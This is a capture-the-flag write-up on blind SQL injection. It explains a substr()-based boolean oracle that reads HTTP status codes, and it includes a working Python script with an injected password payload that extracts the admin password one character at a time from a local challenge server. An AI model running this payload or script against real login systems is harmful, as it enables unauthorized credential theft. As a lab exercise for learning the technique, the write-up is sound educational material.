# SQL Injection 5

In this challenge, we are given a user query service. We are given only 1 GET endpoint, that will read a query parameter
and inject into an SQL statement. The big change made to this final SQL injection challenge is that now, the html response
**doesn't** include the the output of the SQL query.

The strategy here is to build the flag one character at a time and check the response of the server to see if we are on
the right path. 2 questions arise with this approach:

1. How do we go about building the flag one character at a time?
2. How do we check against the server?

After researching a little, I came across the SQL function `substr(string, start_pos, length)`. Starting from `start_pos` (1-indexed) of a `string`
and continuing on to `length` many characters, `substr` will be used to select that portion of a string. Therefore, something like
`substr(password, 1, 1) = 'f'` will check whether the first character of the password is an `f`.

With this information, you can `AND` this with `username='admin'` to create something like this:

```python
payload = SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'test' OR username='admin' AND substr(password,{i},1) = '{char}'
                                                       ^^^^^                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                       We control these parts
```

The `WHERE` clause can be separted into 2 parts:

1. `(username = 'admin' AND password = 'test')`
OR
2. `(username = 'admin' AND substr(password,{i},1) = '{char}')`

The first part will always fail, unless the flag is actually test. The second part is the important part. We need `username = 'admin'`
again, or else the `password` that will be passed into `substr` will also contain the password for the `guest` user. We only care about
`admin` here. The `substr` will return `True` when `char` equals the character of the flag that `i` is indexing.

A simple nested for loop will cover the iterations. But how do we actually check if we guessed correct or not? To answer our 2nd question,
let's take a look at the http status code that is returned, depending on if we authenticate ourselves properly.

On a correct authentication as the `admin` user, we get

```bash
127.0.0.1 - - [...] "POST / HTTP/1.1" 302 -
127.0.0.1 - - [...] "GET / HTTP/1.1" 200 -
```

We see this from the terminal we run the server on. You can see that the POST redirects us to the GET endpoint. Now let's look at a failed
autentication attempt:

```bash
127.0.0.1 - - [09/Oct/2026 23:42:16] "POST / HTTP/1.1" 403 -
```

Therefore, we can determine that `(username = 'admin' AND substr(password,{i},1) = '{char}')` returns `true` when we see status code 200,
and 403 otherwise.

Based on this, we can write a python script using the `requests` library. I did not feel like writing a bash script using curl, that would
just be mean to my mental.

```python
import requests
import string

session = requests.Session()
flag = ""
chars = string.digits + string.ascii_letters + string.punctuation
chars = chars.replace("'", "").replace('"', "")

for i in range(1, 65):
        for char in chars:
                password = f"password=test' OR username='admin' AND substr(password,{i},1) = '{char}"
                
                payload = {
                        "username": "admin",
                        "password": password
                }
                resp = session.post('http://challenge.localhost:80', data=payload)

                if resp.status_code == 200:
                        flag += char
                        print(f"{flag=}")       
                        break

print(flag)
```

Using `Session()` maintains session information like cookies. I use the `string` library to create a character set of printable characters,
subtracting whitespace and the `'` and `"` that will mess up the payload. If the status code of the response is a 200, I go ahead and append
the character to `flag` string and move to the next iteration.

And there you go! You get the flag without the server printing anything out. You essentially used the server's response as an oracle. You will see
a similar attack when we get into breaking cryptography like the AES-CBC encryption by using the PKCS#7 padding error as an oracle.